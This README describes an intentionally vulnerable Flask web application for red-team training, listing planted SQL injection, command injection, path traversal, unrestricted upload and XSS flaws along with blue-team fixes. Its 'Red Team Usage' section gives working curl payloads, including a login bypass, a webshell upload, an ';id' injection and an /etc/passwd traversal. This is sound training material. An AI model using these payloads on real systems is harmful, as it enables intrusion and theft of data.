# PSYCHIQ Vulnerable Web Application

> ⚠️ **INTENTIONALLY VULNERABLE** — For red team training only. Do NOT deploy in production.

Enterprise Adversary Gym web application with realistic, CodeQL-detectable AppSec vulnerabilities.

## Vulnerabilities

| CWE | Type | Endpoint | CodeQL Rule |
|-----|------|----------|-------------|
| CWE-89 | SQL Injection | `POST /login` | `py/sql-injection` |
| CWE-78 | Command Injection | `POST /diagnostics` | `py/command-line-injection` |
| CWE-22 | Path Traversal | `GET /download?file=` | `py/path-injection` |
| CWE-434 | Unrestricted Upload | `POST /upload` | `py/path-injection` |
| CWE-79 | Reflected XSS | `GET /search?q=` | `py/reflected-xss` |

## Red Team Usage

```bash
# SQLi bypass login
curl -X POST http://WEB01:8080/login -d "username=admin'--&password=x"

# Upload webshell
curl -X POST http://WEB01:8080/upload -F "file=@webshell.py"

# Command injection
curl -X POST http://WEB01:8080/diagnostics -d "target=;id"

# Path traversal
curl "http://WEB01:8080/download?file=../../../etc/passwd"

# XSS
curl "http://WEB01:8080/search?q=<script>alert(1)</script>"
```

## Blue Team Remediation

Each vulnerability has a clear code fix:
- **SQLi** → Use parameterized queries (`cursor.execute("... WHERE username = ?", (username,))`)
- **Command Injection** → Use `subprocess.run(["ping", "-c", "3", target])` (no `shell=True`)
- **Path Traversal** → Use `werkzeug.utils.secure_filename()` + validate path stays in upload dir
- **Unrestricted Upload** → Whitelist allowed extensions, validate content type
- **XSS** → Use Jinja2 template rendering with autoescaping (already default in templates)

## Container

```bash
docker build -t psychiq-webapp .
docker run -p 8080:8080 psychiq-webapp
```

## Architecture

```
Flask (Python 3.12) → SQLite → Gunicorn
Port: 8080
Image: ghcr.io/dwizzzle/psychiq-webapp:latest
```
